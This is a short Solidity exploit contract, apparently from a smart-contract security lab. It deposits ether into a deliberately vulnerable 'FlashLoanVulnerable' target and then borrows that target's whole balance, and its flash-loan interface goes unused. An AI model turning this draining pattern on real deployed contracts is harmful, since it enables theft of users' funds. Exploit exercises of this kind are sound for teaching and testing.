// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Vulnerable.sol";

interface IFlashLender {
    function flashLoan(uint256 amount) external;
}

contract FlashLoanAttacker {
    FlashLoanVulnerable public target;

    constructor(address _target) {
        target = FlashLoanVulnerable(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();

        target.borrow(address(target).balance);
    }

    receive() external payable {}
}
